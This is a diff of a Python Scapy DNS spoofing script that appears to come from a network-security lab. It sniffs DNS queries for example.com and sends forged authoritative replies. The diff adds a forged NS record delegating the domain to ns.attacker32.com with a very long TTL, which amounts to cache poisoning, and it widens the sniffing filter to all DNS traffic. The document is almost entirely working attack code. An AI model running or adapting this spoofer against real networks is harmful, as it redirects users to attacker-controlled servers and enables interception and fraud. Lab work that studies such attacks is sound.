@@ -5,7 +5,6 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.inet import IP, UDP
 
 NS_NAME = "example.com"
-DNS_SER_IP = "10.9.0.53"
 
 def spoof_dns(pkt):
     if DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8'):
@@ -13,9 +12,10 @@ def spoof_dns(pkt):
         ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) 
         udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) 
         Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.5', ttl=999999) 
-        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=Anssec) 
+        Nssec = DNSRR(rrname=NS_NAME, type='NS', rdata='ns.attacker32.com', ttl=999999)
+        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=Anssec, ns=Nssec) 
         spoofpkt = ip/udp/dns 
         send(spoofpkt)
 
-myFilter = "udp dst port 53 and ip src " + DNS_SER_IP 
+myFilter = "udp dst port 53"
 pkt = sniff(iface='br-c1e3c02a8177', filter=myFilter, prn=spoof_dns)
